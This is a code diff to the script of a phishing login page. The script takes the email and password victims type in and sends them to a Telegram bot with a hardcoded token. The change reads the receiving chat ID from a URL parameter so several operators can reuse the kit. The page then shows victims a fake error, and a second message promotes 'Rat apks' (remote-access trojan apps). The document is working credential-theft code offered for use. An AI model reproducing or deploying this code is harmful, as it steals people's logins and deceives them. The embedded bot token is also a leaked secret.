@@ -26,16 +26,28 @@
   </center>
 
   <script>
+    // Function to get URL parameters
+    function getQueryParam(param) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(param);
+    }
+
+    const chatId = getQueryParam('id');  // Get the Telegram ID from URL
+    const botToken = "7978969326:AAGaU9fKKl9Y_pgtURqkZHZ5ReDoXwPcYLo"; // Your bot token
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
     document.getElementById('submit').addEventListener('click', function () {
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
-      const botToken = "7978969326:AAGaU9fKKl9Y_pgtURqkZHZ5ReDoXwPcYLo"; // Your bot token
-      const chatId = ""; // Your chat ID
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      // If no chat ID, show error
+      if (!chatId) {
+        alert("Error: Missing chat ID.");
+        return;
+      }
 
       // First message: email and password
       const message1 = `Email: ${email}\nPassword: ${password}`;
-
       // Second message: WhatsApp channel link
       const message2 = `Follow for more Rat apks💀`;
 
@@ -50,34 +62,34 @@
           text: message1
         })
       })
-        .then(response => response.json())
-        .then(data => {
-          if (data.ok) {
-            // Send the second message after the first one succeeds
-            return fetch(url, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json"
-              },
-              body: JSON.stringify({
-                chat_id: chatId,
-                text: message2
-              })
-            });
-          } else {
-            alert("Failed to send details. Check bot token or chat ID.");
-          }
-        })
-        .then(response => {
-          if (response && response.ok) {
-            alert("Error try again later!");
-          }
-        })
-        .catch(error => {
-          console.error("Error:", error);
-          alert("An error occurred.");
-        });
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          // Send the second message
+          return fetch(url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message2
+            })
+          });
+        } else {
+          alert("Failed to send details. Check bot token or chat ID.");
+        }
+      })
+      .then(response => {
+        if (response && response.ok) {
+          alert("Error try again later!");
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        alert("An error occurred.");
+      });
     });
   </script>
 </body>
-</html>
+  </html>
